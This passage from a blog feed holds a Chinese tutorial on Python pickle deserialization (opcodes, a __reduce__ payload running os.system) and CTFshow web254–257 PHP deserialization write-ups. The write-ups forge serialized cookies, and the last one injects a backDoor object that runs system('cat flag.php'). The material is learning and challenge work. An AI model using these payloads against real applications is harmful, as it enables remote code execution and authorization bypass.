&lt;/code&gt;&lt;/pre&gt;
&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;#序列化
pickle.dumps(obj, protocol=None,*,fix_imports=True)
dumps()方法不需要写入文件中，直接返回一个序列化的bytes对象。
#反序列化
pickle.loads(bytes_object, *,fix_imports=True, encoding=&amp;quot;ASCII&amp;quot;. errors=&amp;quot;strict&amp;quot;)
loads()方法是直接从bytes对象中读取序列化的信息，而非从文件中读取。
&lt;/code&gt;&lt;/pre&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;import pickle
import pickletools
import os

class test(object):
    def __init__(self):
        self.value1=&#39;a&#39;
        self.value2=&#39;b&#39;

x=test()
y=pickle.dumps(x)
print(y)
z=pickle.loads(y)
print(z)
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220820152155604.png&#34; alt=&#34;image-20220820152155604&#34; /&gt;&lt;/p&gt;
&lt;p&gt;从上面两个例子可以知道 python 怎么实现序列化和反序列的操作，接下来记录序列化后的字符串是的含义&lt;/p&gt;
&lt;h2 id=&#34;pvm&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#pvm&#34;&gt;#&lt;/a&gt; PVM&lt;/h2&gt;
&lt;p&gt;Python 是一个名为解释器的软件包，解释器是可以让程序运行起来的一套程序，具有独立性，当我们运行一个 python 程序的时候会执行两个步骤&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;先将将源码编译成字节码（字节码是 python 特有的一种表现形式，需要进一步编译才能被机器执行，如果 python 进程在主机上面有写入权限，那么它会吧程序字节码保存为一个.pyc 为扩展名的文件，如果没用则在内存中生成字节码在程序执行结束后被自动抛弃）&lt;/li&gt;
&lt;li&gt;python 程序将编译好的字节码转发到 PVM（python 虚拟机）中，PVM 会循环迭代执行字节码码指令&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;(&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0cxMDExL2FydGljbGUvZGV0YWlscy8xMDI5MDg4ODY=&#34;&gt;https://blog.csdn.net/G1011/article/details/102908886&lt;/span&gt;)&lt;/p&gt;
&lt;h2 id=&#34;pvm和pickle的关系&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#pvm和pickle的关系&#34;&gt;#&lt;/a&gt; PVM 和 Pickle 的关系&lt;/h2&gt;
&lt;p&gt;pickle 是一门基于栈的编程语言，有不同的编程方式，其本质就是一个轻量级的 PVM&lt;/p&gt;
&lt;p&gt;这个轻量级的 PVM 由三部分组成及功能：&lt;/p&gt;
&lt;p&gt;指令处理器：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;从数据流中读取操作码和参数，并对其进行解释处理，之时处理器会循环这个过程，不断改变栈区（stack）和标签区（memo）区域的值，知道遇到.结束。这时最终停留在栈顶的值将会被作为反序列化对象返回
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;栈区（stack）：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;由python的列表（list）实现，作为流数据处理过程中的暂存区，在不断的进出栈过程中完成对数据流的反序列化操作，并最终在栈顶生成反序列化的结果
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;标签区（memo）：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;由python的字典（dict）实现，可以看作是数据索引或者标记，为PVM的整个生命周期提供储存功能
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;python2&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#python2&#34;&gt;#&lt;/a&gt; python2&lt;/h3&gt;
&lt;p&gt;几个比较重要的操作码：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;c: 读取本行的内容作为模块名（module）, 读取下一行的内容作为对象名object，然后将 module.object作为可调用对象压入到栈中
(: 将一个标记对象压入到栈中 , 用于确定命令执行的位置 . 该标记常常搭配 t 指令一起使用 , 以便产生一个元组
S: 后面跟字符串 , PVM会读取引号中的内容 , 直到遇见换行符 , 然后将读取到的内容压入到栈中
t: 从栈中不断弹出数据 , 弹射顺序与压栈时相同 , 直到弹出左括号 . 此时弹出的内容形成了一个元组 , 然后 , 该元组会被压入栈中
R: 将之前压入栈中的元组和可调用对象全部弹出 , 然后将该元组作为可调用对象的参数并执行该对象 。最后将结果压入到栈中
.: 结束整个 Pickle反序列化过程
&lt;/code&gt;&lt;/pre&gt;
&lt;pre&gt;&lt;code&gt;ccopy_reg 			#引入copy_reg模块
_reconstructor 		#引入_reconstructor对象
p0 					#p:将栈顶数据(copy_reg._reconstructor)存储在memo中，0是编号
(c__main__ 			#引入__main__模块
test				#引入test对象
p1					#将栈顶数据(__main__.test)存储在memo中，1是编号
c__builtin__		#引入__builtin__模块
object				#引入object对象
p2					#将栈顶数据(__builtin__.object)存储在memo中，2是编号
Ntp3				#依次从栈中弹出数据直到(，此时弹出的数据组成一个元组，最后将该元组入栈
Rp4					#将元组和可调用对象全部弹出并执行，将结果压入栈顶，然后将栈顶数据存储在memo中
					#这里便完成了所有需要的模块和类对象的调用
(dp5				#在栈顶创建一个字典，将memo中的内容转换成键值对并存储在这个字典中
					#然后栈顶(这个字典)存储在memo中，5是编号
S&#39;value2&#39;			#创建字符串&#39;value2&#39;
p6					#存储在memo中
S&#39;b&#39;				#创建字符串’b‘
p7					#存储在memo中
sS&#39;value1&#39;			#s:将&#39;value2&#39;:&#39;b&#39;作为键值对添加到字典中，创建字符串&#39;value1&#39;
p8					#存储在memo中
S&#39;a&#39;				#创建字符串&#39;a&#39;
p9					#存储在memo中
sb.					#将&#39;value1&#39;:&#39;a&#39;作为键值对添加到字典中,b:调用setstate或者dic.update()更新字典内容
					#读取到.结束pickle序列化过程
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9kb2NzLnB5dGhvbi5vcmcvMi9saWJyYXJ5L2NvcHlfcmVnLmh0bWw=&#34;&gt;copy_reg&lt;/span&gt; 模块，提供了在 pickle 或是 copy 特定对象时，可以运行一个指定的函数，作为对象的构造器&lt;/p&gt;
&lt;h3 id=&#34;python3&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#python3&#34;&gt;#&lt;/a&gt; python3&lt;/h3&gt;
&lt;p&gt;python 运行结果与 python2 不同，这里只有 picpletools&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220820163443278.png&#34; alt=&#34;image-20220820163443278&#34; /&gt;&lt;/p&gt;
&lt;p&gt;0x80：机器看到这个操作符，立刻再去字符串读取一个字节，得到 x04。解释为 “这是一个依据 4 号协议序列化的字符串”，这个操作结束。&lt;br /&gt;
\x8c：创建（引入）对象&lt;/p&gt;
&lt;p&gt;)：向栈中压入一个空数组&lt;br /&gt;
 \x81：从栈空间弹出一个类和参数，并用这个参数实例化这个弹出来的类，最终把实例化的类再次压回栈中。&lt;br /&gt;
}：压入一个空的字典&lt;br /&gt;
 (：向栈中压入一个 MARK 标记&lt;br /&gt;
 X/V：实例化一个字符串&lt;br /&gt;
 u：以键值对的形式进行数据组合（组合的数据为当前栈空间位置到上一个 MARK 之间的数据），并全部添加或更新到该 MARK 之前的一个字典中&lt;br /&gt;
 b：利用填充好的字典和实例化好的对象进行属性赋值。&lt;br /&gt;
. STOP 简单易懂，结束序列化。&lt;/p&gt;
&lt;h2 id=&#34;pickle反序列化漏洞分析&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#pickle反序列化漏洞分析&#34;&gt;#&lt;/a&gt; pickle 反序列化漏洞分析&lt;/h2&gt;
&lt;p&gt;常见 python 反序列化漏洞出现在__educe__() 魔法函数上，这个函数与 PHP 中的__wakeup（）魔术方法类似，都是因为每当反序列化时自动调用&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;import pickle
import os
import pickletools

class test(object):
    def __init__(self):
        self.value1=&#39;abc1&#39;
        self.value2=&#39;abc2&#39;

    def __reduce__(self):
        ls=&amp;quot;dir&amp;quot;
        return (os.system,(ls,))

user = test()
y = pickle.dumps(user)
y = pickletools.optimize(y)
print(y)
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220820162806423.png&#34; alt=&#34;image-20220820162806423&#34; /&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;import pickle
payload=b&#39;\x80\x04\x95\x15\x00\x00\x00\x00\x00\x00\x00\x8c\x02nt\x8c\x06system\x93\x8c\x03dir\x85R.&#39;
pickle.loads(payload)
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220820162837675.png&#34; alt=&#34;image-20220820162837675&#34; /&gt;&lt;/p&gt;
&lt;p&gt;这里成功执行了系统命令&lt;/p&gt;
&lt;h2 id=&#34;opcode&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#opcode&#34;&gt;#&lt;/a&gt; opcode&lt;/h2&gt;
&lt;p&gt;如果需要一次执行多个函数，那么 opcode 尤为重要&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;opcode&lt;/th&gt;
&lt;th&gt;描述&lt;/th&gt;
&lt;th&gt;具体写法&lt;/th&gt;
&lt;th&gt;栈上的变化&lt;/th&gt;
&lt;th&gt;memo 上的变化&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;c&lt;/td&gt;
&lt;td&gt;获取一个全局对象或 import 一个模块（注：会调用 import 语句，能够引入新的包）&lt;/td&gt;
&lt;td&gt;c[module]\n[instance]\n&lt;/td&gt;
&lt;td&gt;获得的对象入栈&lt;/td&gt;
&lt;td&gt;无&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;o&lt;/td&gt;
&lt;td&gt;寻找栈中的上一个 MARK，以之间的第一个数据（必须为函数）为 callable，第二个到第 n 个数据为参数，执行该函数（或实例化一个对象）&lt;/td&gt;
&lt;td&gt;o&lt;/td&gt;
&lt;td&gt;这个过程中涉及到的数据都出栈，函数的返回值（或生成的对象）入栈&lt;/td&gt;
&lt;td&gt;无&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;i&lt;/td&gt;
&lt;td&gt;相当于 c 和 o 的组合，先获取一个全局函数，然后寻找栈中的上一个 MARK，并组合之间的数据为元组，以该元组为参数执行全局函数（或实例化一个对象）&lt;/td&gt;
&lt;td&gt;i[module]\n[callable]\n&lt;/td&gt;
&lt;td&gt;这个过程中涉及到的数据都出栈，函数返回值（或生成的对象）入栈&lt;/td&gt;
&lt;td&gt;无&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;N&lt;/td&gt;
&lt;td&gt;实例化一个 None&lt;/td&gt;
&lt;td&gt;N&lt;/td&gt;
&lt;td&gt;获得的对象入栈&lt;/td&gt;
&lt;td&gt;无&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;S&lt;/td&gt;
&lt;td&gt;实例化一个字符串对象&lt;/td&gt;
&lt;td&gt;S&#39;xxx&#39;\n（也可以使用双引号、&#39; 等 python 字符串形式）&lt;/td&gt;
&lt;td&gt;获得的对象入栈&lt;/td&gt;
&lt;td&gt;无&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;V&lt;/td&gt;
&lt;td&gt;实例化一个 UNICODE 字符串对象&lt;/td&gt;
&lt;td&gt;Vxxx\n&lt;/td&gt;
&lt;td&gt;获得的对象入栈&lt;/td&gt;
&lt;td&gt;无&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;I&lt;/td&gt;
&lt;td&gt;实例化一个 int 对象&lt;/td&gt;
&lt;td&gt;Ixxx\n&lt;/td&gt;
&lt;td&gt;获得的对象入栈&lt;/td&gt;
&lt;td&gt;无&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;F&lt;/td&gt;
&lt;td&gt;实例化一个 float 对象&lt;/td&gt;
&lt;td&gt;Fx.x\n&lt;/td&gt;
&lt;td&gt;获得的对象入栈&lt;/td&gt;
&lt;td&gt;无&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;R&lt;/td&gt;
&lt;td&gt;选择栈上的第一个对象作为函数、第二个对象作为参数（第二个对象必须为元组），然后调用该函数&lt;/td&gt;
&lt;td&gt;R&lt;/td&gt;
&lt;td&gt;函数和参数出栈，函数的返回值入栈&lt;/td&gt;
&lt;td&gt;无&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;.&lt;/td&gt;
&lt;td&gt;程序结束，栈顶的一个元素作为 pickle.loads () 的返回值&lt;/td&gt;
&lt;td&gt;.&lt;/td&gt;
&lt;td&gt;无&lt;/td&gt;
&lt;td&gt;无&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;(&lt;/td&gt;
&lt;td&gt;向栈中压入一个 MARK 标记&lt;/td&gt;
&lt;td&gt;(&lt;/td&gt;
&lt;td&gt;MARK 标记入栈&lt;/td&gt;
&lt;td&gt;无&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;t&lt;/td&gt;
&lt;td&gt;寻找栈中的上一个 MARK，并组合之间的数据为元组&lt;/td&gt;
&lt;td&gt;t&lt;/td&gt;
&lt;td&gt;MARK 标记以及被组合的数据出栈，获得的对象入栈&lt;/td&gt;
&lt;td&gt;无&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;)&lt;/td&gt;
&lt;td&gt;向栈中直接压入一个空元组&lt;/td&gt;
&lt;td&gt;)&lt;/td&gt;
&lt;td&gt;空元组入栈&lt;/td&gt;
&lt;td&gt;无&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;l&lt;/td&gt;
&lt;td&gt;寻找栈中的上一个 MARK，并组合之间的数据为列表&lt;/td&gt;
&lt;td&gt;l&lt;/td&gt;
&lt;td&gt;MARK 标记以及被组合的数据出栈，获得的对象入栈&lt;/td&gt;
&lt;td&gt;无&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;]&lt;/td&gt;
&lt;td&gt;向栈中直接压入一个空列表&lt;/td&gt;
&lt;td&gt;]&lt;/td&gt;
&lt;td&gt;空列表入栈&lt;/td&gt;
&lt;td&gt;无&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;d&lt;/td&gt;
&lt;td&gt;寻找栈中的上一个 MARK，并组合之间的数据为字典（数据必须有偶数个，即呈 key-value 对）&lt;/td&gt;
&lt;td&gt;d&lt;/td&gt;
&lt;td&gt;MARK 标记以及被组合的数据出栈，获得的对象入栈&lt;/td&gt;
&lt;td&gt;无&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;}&lt;/td&gt;
&lt;td&gt;向栈中直接压入一个空字典&lt;/td&gt;
&lt;td&gt;}&lt;/td&gt;
&lt;td&gt;空字典入栈&lt;/td&gt;
&lt;td&gt;无&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;p&lt;/td&gt;
&lt;td&gt;将栈顶对象储存至 memo_n&lt;/td&gt;
&lt;td&gt;pn\n&lt;/td&gt;
&lt;td&gt;无&lt;/td&gt;
&lt;td&gt;对象被储存&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;g&lt;/td&gt;
&lt;td&gt;将 memo_n 的对象压栈&lt;/td&gt;
&lt;td&gt;gn\n&lt;/td&gt;
&lt;td&gt;对象被压栈&lt;/td&gt;
&lt;td&gt;无&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;0&lt;/td&gt;
&lt;td&gt;丢弃栈顶对象&lt;/td&gt;
&lt;td&gt;0&lt;/td&gt;
&lt;td&gt;栈顶对象被丢弃&lt;/td&gt;
&lt;td&gt;无&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;b&lt;/td&gt;
&lt;td&gt;使用栈中的第一个元素（储存多个属性名：属性值的字典）对第二个元素（对象实例）进行属性设置&lt;/td&gt;
&lt;td&gt;b&lt;/td&gt;
&lt;td&gt;栈上第一个元素出栈&lt;/td&gt;
&lt;td&gt;无&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;s&lt;/td&gt;
&lt;td&gt;将栈的第一个和第二个对象作为 key-value 对，添加或更新到栈的第三个对象（必须为列表或字典，列表以数字作为 key）中&lt;/td&gt;
&lt;td&gt;s&lt;/td&gt;
&lt;td&gt;第一、二个元素出栈，第三个元素（列表或字典）添加新值或被更新&lt;/td&gt;
&lt;td&gt;无&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;u&lt;/td&gt;
&lt;td&gt;寻找栈中的上一个 MARK，组合之间的数据（数据必须有偶数个，即呈 key-value 对）并全部添加或更新到该 MARK 之前的一个元素（必须为字典）中&lt;/td&gt;
&lt;td&gt;u&lt;/td&gt;
&lt;td&gt;MARK 标记以及被组合的数据出栈，字典被更新&lt;/td&gt;
&lt;td&gt;无&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;a&lt;/td&gt;
&lt;td&gt;将栈的第一个元素 append 到第二个元素 (列表) 中&lt;/td&gt;
&lt;td&gt;a&lt;/td&gt;
&lt;td&gt;栈顶元素出栈，第二个元素（列表）被更新&lt;/td&gt;
&lt;td&gt;无&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;e&lt;/td&gt;
&lt;td&gt;寻找栈中的上一个 MARK，组合之间的数据并 extends 到该 MARK 之前的一个元素（必须为列表）中&lt;/td&gt;
&lt;td&gt;e&lt;/td&gt;
&lt;td&gt;MARK 标记以及被组合的数据出栈，列表被更新&lt;/td&gt;
&lt;td&gt;无&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h4 id=&#34;拼接opcode&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#拼接opcode&#34;&gt;#&lt;/a&gt; 拼接 opcode&lt;/h4&gt;
&lt;p&gt;将第一个 pickle 流结尾表示结束的。去掉，将第二个 pickle 流与第一个拼接起来即可。&lt;/p&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://blog.xcu.icu/2023/03/05/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</guid>
            <title>CTFshow-web入门php反序列化</title>
            <link>https://blog.xcu.icu/2023/03/05/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</link>
            <category term="CTFshow" scheme="https://blog.xcu.icu/categories/CTFshow/" />
            <category term="php反序列化" scheme="https://blog.xcu.icu/tags/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" />
            <pubDate>Sun, 05 Mar 2023 12:00:00 +0800</pubDate>
            <description><![CDATA[ &lt;h2 id=&#34;前言&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#前言&#34;&gt;#&lt;/a&gt; 前言&lt;/h2&gt;
&lt;p&gt;本篇记录反序列化的学习，有关知识点可以看我的这篇文章&lt;a href=&#34;https://blog.xcu.icu/2022/11/02/php%E5%BA%8F%E5%88%97%E5%8C%96/&#34;&gt; php 反序列化 - Web | Clown の Blog = (xcu.icu)&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&#34;web254&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#web254&#34;&gt;#&lt;/a&gt; web254&lt;/h2&gt;
&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;&amp;lt;?php
error_reporting(0);
highlight_file(__FILE__);
include(&#39;flag.php&#39;);

class ctfShowUser&amp;#123;
    public $username=&#39;xxxxxx&#39;;
    public $password=&#39;xxxxxx&#39;;
    public $isVip=false;

    public function checkVip()&amp;#123;
        return $this-&amp;gt;isVip;
    &amp;#125;
    public function login($u,$p)&amp;#123;
        if($this-&amp;gt;username===$u&amp;amp;&amp;amp;$this-&amp;gt;password===$p)&amp;#123;
            $this-&amp;gt;isVip=true;
        &amp;#125;
        return $this-&amp;gt;isVip;
    &amp;#125;
    public function vipOneKeyGetFlag()&amp;#123;
        if($this-&amp;gt;isVip)&amp;#123;
            global $flag;
            echo &amp;quot;your flag is &amp;quot;.$flag;
        &amp;#125;else&amp;#123;
            echo &amp;quot;no vip, no flag&amp;quot;;
        &amp;#125;
    &amp;#125;
&amp;#125;

$username=$_GET[&#39;username&#39;];
$password=$_GET[&#39;password&#39;];

if(isset($username) &amp;amp;&amp;amp; isset($password))&amp;#123;
    $user = new ctfShowUser();
    if($user-&amp;gt;login($username,$password))&amp;#123;
        if($user-&amp;gt;checkVip())&amp;#123;
            $user-&amp;gt;vipOneKeyGetFlag();
        &amp;#125;
    &amp;#125;else&amp;#123;
        echo &amp;quot;no vip,no flag&amp;quot;;
    &amp;#125;
&amp;#125;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;这题 emmm 感觉不想是反序列化啊，就审计一下&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;?username=xxxxxx&amp;amp;password=xxxxxx
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230301201449519.png&#34; alt=&#34;image-20230301201449519&#34; /&gt;&lt;/p&gt;
&lt;p&gt;这里简单说一下逻辑，先看下面，$username 和 $password 先接受 get 的参数，然后 if 判断差数是否存在，如果存在就实例化类 ctfshowUser，然后调用类中的 login 方法判断用户名和密码是否正确正确给 $isVip 赋值为 ture，接着调用 checkVip 函数检测上一步有没有通过（有点怪），最后调用 vipOneKeyGetFlag 函数输出 flag（因为后面的题是这个的改动，所以这个稍微写的详细一点）&lt;/p&gt;
&lt;h2 id=&#34;web255&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#web255&#34;&gt;#&lt;/a&gt; web255&lt;/h2&gt;
&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;&amp;lt;?php
error_reporting(0);
highlight_file(__FILE__);
include(&#39;flag.php&#39;);

class ctfShowUser&amp;#123;
    public $username=&#39;xxxxxx&#39;;
    public $password=&#39;xxxxxx&#39;;
    public $isVip=false;

    public function checkVip()&amp;#123;
        return $this-&amp;gt;isVip;
    &amp;#125;
    public function login($u,$p)&amp;#123;
        return $this-&amp;gt;username===$u&amp;amp;&amp;amp;$this-&amp;gt;password===$p;
    &amp;#125;
    public function vipOneKeyGetFlag()&amp;#123;
        if($this-&amp;gt;isVip)&amp;#123;
            global $flag;
            echo &amp;quot;your flag is &amp;quot;.$flag;
        &amp;#125;else&amp;#123;
            echo &amp;quot;no vip, no flag&amp;quot;;
        &amp;#125;
    &amp;#125;
&amp;#125;

$username=$_GET[&#39;username&#39;];
$password=$_GET[&#39;password&#39;];

if(isset($username) &amp;amp;&amp;amp; isset($password))&amp;#123;
    $user = unserialize($_COOKIE[&#39;user&#39;]);    
    if($user-&amp;gt;login($username,$password))&amp;#123;
        if($user-&amp;gt;checkVip())&amp;#123;
            $user-&amp;gt;vipOneKeyGetFlag();
        &amp;#125;
    &amp;#125;else&amp;#123;
        echo &amp;quot;no vip,no flag&amp;quot;;
    &amp;#125;
&amp;#125;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;这里多了一个 cookie 被反序列化很明显了，利用这个给 isvip 赋值就可以了&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;&amp;lt;?php

class ctfShowUser&amp;#123;
    public $username=&#39;xxxxxx&#39;;
    public $password=&#39;xxxxxx&#39;;
    public $isVip=true;
&amp;#125;
$a = new ctfShowUser();
echo urlencode(serialize($a));
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230301203023324.png&#34; alt=&#34;image-20230301203023324&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;web256&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#web256&#34;&gt;#&lt;/a&gt; web256&lt;/h2&gt;
&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;&amp;lt;?php
error_reporting(0);
highlight_file(__FILE__);
include(&#39;flag.php&#39;);

class ctfShowUser&amp;#123;
    public $username=&#39;xxxxxx&#39;;
    public $password=&#39;xxxxxx&#39;;
    public $isVip=false;

    public function checkVip()&amp;#123;
        return $this-&amp;gt;isVip;
    &amp;#125;
    public function login($u,$p)&amp;#123;
        return $this-&amp;gt;username===$u&amp;amp;&amp;amp;$this-&amp;gt;password===$p;
    &amp;#125;
    public function vipOneKeyGetFlag()&amp;#123;
        if($this-&amp;gt;isVip)&amp;#123;
            global $flag;
            if($this-&amp;gt;username!==$this-&amp;gt;password)&amp;#123;
                    echo &amp;quot;your flag is &amp;quot;.$flag;
              &amp;#125;
        &amp;#125;else&amp;#123;
            echo &amp;quot;no vip, no flag&amp;quot;;
        &amp;#125;
    &amp;#125;
&amp;#125;

$username=$_GET[&#39;username&#39;];
$password=$_GET[&#39;password&#39;];

if(isset($username) &amp;amp;&amp;amp; isset($password))&amp;#123;
    $user = unserialize($_COOKIE[&#39;user&#39;]);    
    if($user-&amp;gt;login($username,$password))&amp;#123;
        if($user-&amp;gt;checkVip())&amp;#123;
            $user-&amp;gt;vipOneKeyGetFlag();
        &amp;#125;
    &amp;#125;else&amp;#123;
        echo &amp;quot;no vip,no flag&amp;quot;;
    &amp;#125;
&amp;#125;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;这里有加上了一条 username 和 pasword 的不同&lt;/p&gt;
&lt;p&gt;简单改一下上一题的 payload 就可以直接用&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;&amp;lt;?php

class ctfShowUser&amp;#123;
    public $username=&#39;demo&#39;;
    public $password=&#39;xxxxxx&#39;;
    public $isVip=true;
&amp;#125;
$a = new ctfShowUser();
echo urlencode(serialize($a));
//O%3A11%3A%22ctfShowUser%22%3A3%3A%7Bs%3A8%3A%22username%22%3Bs%3A4%3A%22demo%22%3Bs%3A8%3A%22password%22%3Bs%3A6%3A%22xxxxxx%22%3Bs%3A5%3A%22isVip%22%3Bb%3A1%3B%7D
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230302191137410.png&#34; alt=&#34;image-20230302191137410&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;web257&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#web257&#34;&gt;#&lt;/a&gt; web257&lt;/h2&gt;
&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;&amp;lt;?php
error_reporting(0);
highlight_file(__FILE__);

class ctfShowUser&amp;#123;
    private $username=&#39;xxxxxx&#39;;
    private $password=&#39;xxxxxx&#39;;
    private $isVip=false;
    private $class = &#39;info&#39;;

    public function __construct()&amp;#123;
        $this-&amp;gt;class=new info();
    &amp;#125;
    public function login($u,$p)&amp;#123;
        return $this-&amp;gt;username===$u&amp;amp;&amp;amp;$this-&amp;gt;password===$p;
    &amp;#125;
    public function __destruct()&amp;#123;
        $this-&amp;gt;class-&amp;gt;getInfo();
    &amp;#125;

&amp;#125;

class info&amp;#123;
    private $user=&#39;xxxxxx&#39;;
    public function getInfo()&amp;#123;
        return $this-&amp;gt;user;
    &amp;#125;
&amp;#125;

class backDoor&amp;#123;
    private $code;
    public function getInfo()&amp;#123;
        eval($this-&amp;gt;code);
    &amp;#125;
&amp;#125;

$username=$_GET[&#39;username&#39;];
$password=$_GET[&#39;password&#39;];

if(isset($username) &amp;amp;&amp;amp; isset($password))&amp;#123;
    $user = unserialize($_COOKIE[&#39;user&#39;]);
    $user-&amp;gt;login($username,$password);
&amp;#125;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;这里的利用思路是在 ctfShowUser 里有一个__destruct 的方法会在对象销毁的时候会自动调用函数 getInfo ()，而在 backDoor 类中也有这个方法，而且会执行 eval 函数，这里我们需要覆盖这个__construct 方法&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;&amp;lt;?php
class ctfShowUser&amp;#123;
    public function __construct()&amp;#123;
        $this-&amp;gt;class=new backDoor();
    &amp;#125;
&amp;#125;

class backDoor&amp;#123;
    private $code=&amp;quot;system(&#39;cat flag.php&#39;);&amp;quot;;
&amp;#125;
$a=new ctfShowUser();
echo serialize($a);
echo &amp;quot;\n&amp;quot;;
echo urlencode(serialize($a));
/*
O:11:&amp;quot;ctfShowUser&amp;quot;:1:&amp;#123;s:5:&amp;quot;class&amp;quot;;O:8:&amp;quot;backDoor&amp;quot;:1:&amp;#123;s:14:&amp;quot; backDoor code&amp;quot;;s:23:&amp;quot;system(&#39;cat flag.php&#39;);&amp;quot;;&amp;#125;&amp;#125;
O%3A11%3A%22ctfShowUser%22%3A1%3A%7Bs%3A5%3A%22class%22%3BO%3A8%3A%22backDoor%22%3A1%3A%7Bs%3A14%3A%22%00backDoor%00code%22%3Bs%3A23%3A%22system%28%27cat+flag.php%27%29%3B%22%3B%7D%7D
*/
&lt;/code&gt;&lt;/pre&gt;
